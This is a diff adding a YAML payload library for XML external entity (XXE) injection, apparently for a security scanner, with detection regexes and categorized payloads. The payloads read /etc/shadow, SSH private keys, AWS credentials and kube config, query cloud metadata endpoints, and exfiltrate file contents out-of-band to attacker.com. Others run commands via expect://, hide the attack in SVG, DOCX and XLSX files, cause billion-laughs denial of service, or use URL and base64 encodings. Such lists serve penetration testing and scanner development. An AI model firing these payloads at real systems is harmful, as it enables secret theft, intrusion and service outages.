@@ -1,0 +1,407 @@
+metadata:
+  type: xxe/basic
+  version: "1.0"
+  description: "XXE injection payloads"
+  sources: ["OWASP", "PortSwigger", "PayloadsAllTheThings", "HackTricks"]
+
+detection_patterns:
+  - "root:.*?:0:0:"
+  - "(?i)ENTITY"
+  - "(?i)DOCTYPE"
+  - "(?i)SYSTEM"
+
+payloads:
+  file_read:
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"
+      description: "Basic XXE file read /etc/passwd"
+      severity: critical
+      tags: [file_read, basic, linux]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><root>&xxe;</root>"
+      description: "XXE read /etc/shadow"
+      severity: critical
+      tags: [file_read, linux]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><root>&xxe;</root>"
+      description: "XXE read /etc/hosts"
+      severity: high
+      tags: [file_read, linux]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><root>&xxe;</root>"
+      description: "XXE read hostname"
+      severity: high
+      tags: [file_read, linux]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/version\">]><root>&xxe;</root>"
+      description: "XXE read kernel version"
+      severity: high
+      tags: [file_read, linux]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><root>&xxe;</root>"
+      description: "XXE read process env"
+      severity: critical
+      tags: [file_read, linux]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/cmdline\">]><root>&xxe;</root>"
+      description: "XXE read cmdline"
+      severity: high
+      tags: [file_read, linux]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/issue\">]><root>&xxe;</root>"
+      description: "XXE read OS version"
+      severity: high
+      tags: [file_read, linux]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/group\">]><root>&xxe;</root>"
+      description: "XXE read group"
+      severity: high
+      tags: [file_read, linux]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/ssh/sshd_config\">]><root>&xxe;</root>"
+      description: "XXE read SSH config"
+      severity: high
+      tags: [file_read, linux]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///home/user/.ssh/id_rsa\">]><root>&xxe;</root>"
+      description: "XXE read SSH key"
+      severity: critical
+      tags: [file_read, linux]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///root/.ssh/id_rsa\">]><root>&xxe;</root>"
+      description: "XXE read root SSH key"
+      severity: critical
+      tags: [file_read, linux]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///var/www/html/.env\">]><root>&xxe;</root>"
+      description: "XXE read .env"
+      severity: critical
+      tags: [file_read, linux]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///var/www/html/wp-config.php\">]><root>&xxe;</root>"
+      description: "XXE read WordPress config"
+      severity: critical
+      tags: [file_read, linux]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/httpd/conf/httpd.conf\">]><root>&xxe;</root>"
+      description: "XXE read Apache config"
+      severity: high
+      tags: [file_read, linux]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/nginx/nginx.conf\">]><root>&xxe;</root>"
+      description: "XXE read Nginx config"
+      severity: high
+      tags: [file_read, linux]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\">]><root>&xxe;</root>"
+      description: "XXE read Windows hosts"
+      severity: high
+      tags: [file_read, windows]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><root>&xxe;</root>"
+      description: "XXE read Windows win.ini"
+      severity: high
+      tags: [file_read, windows]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/boot.ini\">]><root>&xxe;</root>"
+      description: "XXE read Windows boot.ini"
+      severity: high
+      tags: [file_read, windows]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/system32/config/sam\">]><root>&xxe;</root>"
+      description: "XXE read Windows SAM"
+      severity: critical
+      tags: [file_read, windows]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/mysql/my.cnf\">]><root>&xxe;</root>"
+      description: "XXE read MySQL config"
+      severity: high
+      tags: [file_read, linux]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/redis/redis.conf\">]><root>&xxe;</root>"
+      description: "XXE read Redis config"
+      severity: high
+      tags: [file_read, linux]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///root/.aws/credentials\">]><root>&xxe;</root>"
+      description: "XXE read AWS credentials"
+      severity: critical
+      tags: [file_read, cloud]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///root/.kube/config\">]><root>&xxe;</root>"
+      description: "XXE read Kubernetes config"
+      severity: critical
+      tags: [file_read, cloud]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///var/log/apache2/access.log\">]><root>&xxe;</root>"
+      description: "XXE read Apache log"
+      severity: high
+      tags: [file_read, log]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///var/log/auth.log\">]><root>&xxe;</root>"
+      description: "XXE read auth log"
+      severity: high
+      tags: [file_read, log]
+
+  ssrf:
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]><root>&xxe;</root>"
+      description: "XXE SSRF external"
+      severity: critical
+      tags: [ssrf, external]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>"
+      description: "XXE AWS metadata"
+      severity: critical
+      tags: [ssrf, aws]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">]><root>&xxe;</root>"
+      description: "XXE AWS IAM credentials"
+      severity: critical
+      tags: [ssrf, aws, iam]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/computeMetadata/v1/\">]><root>&xxe;</root>"
+      description: "XXE GCP metadata"
+      severity: critical
+      tags: [ssrf, gcp]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\">]><root>&xxe;</root>"
+      description: "XXE Azure metadata"
+      severity: critical
+      tags: [ssrf, azure]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://100.100.100.200/latest/meta-data/\">]><root>&xxe;</root>"
+      description: "XXE Alibaba metadata"
+      severity: critical
+      tags: [ssrf, alibaba]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1/\">]><root>&xxe;</root>"
+      description: "XXE localhost"
+      severity: critical
+      tags: [ssrf, localhost]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:8080/\">]><root>&xxe;</root>"
+      description: "XXE localhost 8080"
+      severity: critical
+      tags: [ssrf, localhost]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://10.0.0.1/\">]><root>&xxe;</root>"
+      description: "XXE internal network"
+      severity: critical
+      tags: [ssrf, internal]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://192.168.1.1/\">]><root>&xxe;</root>"
+      description: "XXE router"
+      severity: critical
+      tags: [ssrf, internal]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://kubernetes.default.svc/\">]><root>&xxe;</root>"
+      description: "XXE Kubernetes API"
+      severity: critical
+      tags: [ssrf, kubernetes]
+
+  blind_xxe:
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/xxe.dtd\">%xxe;]><root>test</root>"
+      description: "Blind XXE with external DTD"
+      severity: critical
+      tags: [blind, external_dtd]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/xxe.dtd\">%xxe;%param1;]><root>test</root>"
+      description: "Blind XXE with parameter entity"
+      severity: critical
+      tags: [blind, parameter_entity]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>\">%eval;%exfil;]><root>test</root>"
+      description: "Blind XXE OOB exfiltration"
+      severity: critical
+      tags: [blind, oob, exfil]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval '<!ENTITY &#x25; exfil SYSTEM \"http://attacker.com/?data=%file;\">'>%eval;%exfil;]><root>test</root>"
+      description: "Blind XXE OOB variant"
+      severity: critical
+      tags: [blind, oob, exfil]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % data SYSTEM \"file:///etc/passwd\"><!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://attacker.com/?d=%data;'>\">%param1;]><root>&exfil;</root>"
+      description: "Blind XXE data exfil"
+      severity: critical
+      tags: [blind, oob, exfil]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % start \"<![CDATA[\"><!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % end \"]]>\"><!ENTITY % dtd SYSTEM \"http://attacker.com/xxe.dtd\">%dtd;]><root>&send;</root>"
+      description: "Blind XXECDATA exfil"
+      severity: critical
+      tags: [blind, cdata, exfil]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://attacker.com/xxe.dtd\">%dtd;]><root>test</root>"
+      description: "Blind XXE external DTD file"
+      severity: critical
+      tags: [blind, external_dtd]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">%xxe;]><root>test</root>"
+      description: "Blind XXE PHP filter base64"
+      severity: critical
+      tags: [blind, php, base64]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"gopher://attacker.com/\">%xxe;]><root>test</root>"
+      description: "Blind XXE gopher"
+      severity: critical
+      tags: [blind, gopher]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"jar:http://attacker.com/file.jar!/\">%xxe;]><root>test</root>"
+      description: "Blind XXE jar"
+      severity: critical
+      tags: [blind, jar]
+
+  svg_xxe:
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>"
+      description: "SVG XXE file read"
+      severity: critical
+      tags: [svg, file_read]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>"
+      description: "SVG XXE shadow"
+      severity: critical
+      tags: [svg, file_read]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>"
+      description: "SVG XXE SSRF"
+      severity: critical
+      tags: [svg, ssrf]
+
+    - value: "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"200\" height=\"200\"><text x=\"0\" y=\"20\">&#x26xxe;</text></svg>"
+      description: "SVG XXE with xlink"
+      severity: critical
+      tags: [svg, xlink]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE svg [<!ENTITY % xxe SYSTEM \"http://attacker.com/xxe.dtd\">%xxe;]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>test</text></svg>"
+      description: "SVG blind XXE"
+      severity: critical
+      tags: [svg, blind]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>"
+      description: "SVG XXE env read"
+      severity: critical
+      tags: [svg, file_read]
+
+  xinclude:
+    - value: "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>"
+      description: "XInclude file read"
+      severity: critical
+      tags: [xinclude, file_read]
+
+    - value: "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/shadow\"/></foo>"
+      description: "XInclude shadow"
+      severity: critical
+      tags: [xinclude, file_read]
+
+    - value: "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"http://attacker.com/\"/></foo>"
+      description: "XInclude SSRF"
+      severity: critical
+      tags: [xinclude, ssrf]
+
+    - value: "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///proc/version\"/></foo>"
+      description: "XInclude kernel version"
+      severity: high
+      tags: [xinclude, file_read]
+
+    - value: "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///proc/self/environ\"/></foo>"
+      description: "XInclude env"
+      severity: critical
+      tags: [xinclude, file_read]
+
+    - value: "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"xml\" href=\"file:///etc/passwd\"/></foo>"
+      description: "XInclude XML parse"
+      severity: critical
+      tags: [xinclude, file_read]
+
+  docx_xxe:
+    - value: "[Content_Types].xml with <!ENTITY xxe SYSTEM \"file:///etc/passwd\">"
+      description: "DOCX XXE via content types"
+      severity: critical
+      tags: [docx, file_read]
+
+    - value: "word/document.xml with <!ENTITY xxe SYSTEM \"file:///etc/passwd\">"
+      description: "DOCX XXE via document.xml"
+      severity: critical
+      tags: [docx, file_read]
+
+    - value: "word/_rels/document.xml.rels with external entity"
+      description: "DOCX XXE via rels"
+      severity: critical
+      tags: [docx, file_read]
+
+    - value: "DOCX with <!ENTITY % xxe SYSTEM \"http://attacker.com/xxe.dtd\">%xxe;"
+      description: "DOCX blind XXE"
+      severity: critical
+      tags: [docx, blind]
+
+  xlsx_xxe:
+    - value: "xl/sharedStrings.xml with <!ENTITY xxe SYSTEM \"file:///etc/passwd\">"
+      description: "XLSX XXE via shared strings"
+      severity: critical
+      tags: [xlsx, file_read]
+
+    - value: "xl/worksheets/sheet1.xml with <!ENTITY xxe SYSTEM \"file:///etc/passwd\">"
+      description: "XLSX XXE via sheet"
+      severity: critical
+      tags: [xlsx, file_read]
+
+    - value: "XLSX with <!ENTITY % xxe SYSTEM \"http://attacker.com/xxe.dtd\">%xxe;"
+      description: "XLSX blind XXE"
+      severity: critical
+      tags: [xlsx, blind]
+
+  xxe_rce:
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><root>&xxe;</root>"
+      description: "XXE RCE via expect"
+      severity: critical
+      tags: [rce, expect]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://whoami\">]><root>&xxe;</root>"
+      description: "XXE RCE whoami"
+      severity: critical
+      tags: [rce, expect]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><root>&xxe;</root>"
+      description: "XXE PHP filter base64"
+      severity: critical
+      tags: [rce, php, base64]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://input\">]><root>&xxe;</root>"
+      description: "XXE PHP input"
+      severity: critical
+      tags: [rce, php]
+
+    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"data://text/plain;base64,SSBsb3ZlIFBIUAo=\">]><root>&xxe;</root>"
+      description: "XXE data wrapper"
+      severity: high
+      tags: [rce, data]
+
+  xxe_dos:
+    - value: "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\"><!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">]><root>&lol4;</root>"
+      description: "Billion laughs DoS"
+      severity: high
+      tags: [dos, billion_laughs]
+
+    - value: "<?xml version=\"1.0\"?><!DOCTYPE bomb [<!ENTITY a \"<!ENTITY b 'aaaaaaaaaaaaaaaaaaaaaaaaaaaa'>\">]><root>&a;</root>"
+      description: "XML bomb variant"
+      severity: high
+      tags: [dos, bomb]
+
+    - value: "<?xml version=\"1.0\"?><!DOCTYPE bomb [<!ENTITY a \"aaaaaaa...\"><!ENTITY b \"&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\">]><root>&b;</root>"
+      description: "XML bomb expansion"
+      severity: high
+      tags: [dos, bomb]
+
+  xxe_encoded:
+    - value: "%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE%20foo%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E"
+      description: "URL encoded XXE"
+      severity: critical
+      tags: [encoded, url]
+
+    - value: "&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;"
+      description: "HTML entity encoded XXE"
+      severity: critical
+      tags: [encoded, html_entity]
+
+    - value: "PD94bWwgdmVyc2lvbj0iMS4wIj8+PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgeHhlIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIj5dPjxyb290PiZ4eGU7PC9yb290Pg=="
+      description: "Base64 encoded XXE"
+      severity: critical
+      tags: [encoded, base64]
